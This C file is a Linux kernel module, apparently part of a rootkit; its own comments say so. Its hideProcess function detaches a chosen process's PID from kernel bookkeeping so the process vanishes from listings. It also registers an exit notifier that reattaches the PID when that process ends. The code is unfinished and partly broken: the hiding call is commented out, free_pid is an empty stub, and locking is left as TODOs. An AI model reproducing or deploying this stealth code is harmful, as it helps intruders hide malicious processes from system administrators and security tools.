#include <linux/pid.h>
#include <linux/sched.h> // for task_struct
#include <linux/rculist.h>
#include <linux/profile.h>

#include "messagesToUser.h"
#include "processHider.h"

#ifndef CONFIG_PROFILING
	#error "this module requires config profiling enabled"
#endif


//#include "doExitHijack.h"


// prototypes for functions from pid.c

static struct pid *__changePidAndGetOldPid(struct task_struct *task, enum pid_type type, struct pid *new);
struct pid *detachPidAndGetOldPid(struct task_struct *task, enum pid_type type);
static struct pid *changePidAndGetOldPid(struct task_struct *task, enum pid_type type, 	struct pid *pid);
void free_pid(struct pid *pid);
static int hideProcess(int pidNumber);

static void *hiddenTask = NULL;
struct pid *oldPidToRestore = NULL;

int notificationFunction(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
	//printInfo("in notification function for exit - task is %p\n", task);
	if (task == hiddenTask) {
		printInfo("FOUND PID THAT WAS HIDDEN");

		{
			//TODO: check which pid type to restore - this may put too many in..
			struct pid *pid = oldPidToRestore;
			rcu_read_lock(); 	//TODO: hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h

			attach_pid(task, PIDTYPE_MAX, pid);
			attach_pid(task, PIDTYPE_PGID, pid);
			attach_pid(task, PIDTYPE_PID, pid);
			attach_pid(task, PIDTYPE_SID, pid);

			rcu_read_unlock();
		}

		//TODO: restore oldPidToRestore


		hiddenTask = NULL;
	}


	return 0;
}
struct notifier_block notificationOnProcessExit = {
	.notifier_call = notificationFunction,
	.next = NULL,// TODO: CHECK THIS
	.priority = 1, // TODO: CHECK THIS
};


int processHider_init(void) {
	//TODO: only hide proccess when wanted ...
	//pid_t pid = 2404; //TODO: change this 
	//hideProcess(pid); // todo: perhaps use result of function call..
	//TODO: check if hid is already hidden - trying to hide it multiple times causes issues

	//replacement_do_exit(0);

	//TODO: check value returned..

	// this will fail if profiling is disabled
	int error = profile_event_register(PROFILE_TASK_EXIT, &notificationOnProcessExit);
	if (error != 0) { //todo : extract function..
		return error;
	}
	return 0;
}


void processHider_exit(void) {
	// TODO: show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
		// alternatively kill them / require that the tasks are dead first..

	//TODO: ensure code is not in notifier when exit is progress / going to be called..
	int error;
	error = profile_event_unregister(PROFILE_TASK_EXIT, &notificationOnProcessExit);
}


//returns error code...
//PRESENTLY ONLY SUPPORTS HIDING ONE PROCESS
static int hideProcess(int pidNumber) {
	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
	if (pid == NULL) {
		return 1;
	}
	
	rcu_read_lock(); 	//TODO: hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
	
	{
		struct task_struct *task = pid_task(pid, PIDTYPE_PID);

		if (hiddenTask != NULL) {
			printInfo("warning another task was already hidden - this is not supported properly yet\n");
		}
		hiddenTask = task;
		
		oldPidToRestore = detachPidAndGetOldPid(task, PIDTYPE_PID);
	}
	
	rcu_read_unlock();
	
	//todo release lock..
	
	printInfo("pid points to %p\n", pid); // TODO: print time etc..
	
	return 0;
}


//from linux kernel... version... pid.c

void attach_pid(struct task_struct *task, enum pid_type type,
		struct pid *pid)
{
	struct pid_link *link;

	link = &task->pids[type];
	link->pid = pid;
	hlist_add_head_rcu(&link->node, &pid->tasks[type]);
}




static struct pid *__changePidAndGetOldPid(struct task_struct *task, enum pid_type type,
			struct pid *new)
{
	struct pid_link *link;
	struct pid *oldPid;
	int tmp;

	link = &task->pids[type];
	oldPid = link->pid;

	hlist_del_rcu(&link->node);
	link->pid = new;

	//TODO: store each old pid to enable them to be stored as is....
	for (tmp = PIDTYPE_MAX; --tmp >= 0; )
		if (!hlist_empty(&oldPid->tasks[tmp]))
			return oldPid;


	// don't free so that it can be assigned again later
	//free_pid(oldPid);
	return oldPid;
}

struct pid *detachPidAndGetOldPid(struct task_struct *task, enum pid_type type)
{
	return __changePidAndGetOldPid(task, type, NULL);
}

struct pid *changePidAndGetOldPid(struct task_struct *task, enum pid_type type,
		struct pid *pid)
{
	struct pid *oldPid =__changePidAndGetOldPid(task, type, pid);
	attach_pid(task, type, pid);
	return oldPid;
}


void free_pid(struct pid *pid) {
	//TODO: copy this from pid.c / fill in dependancies etc..

}
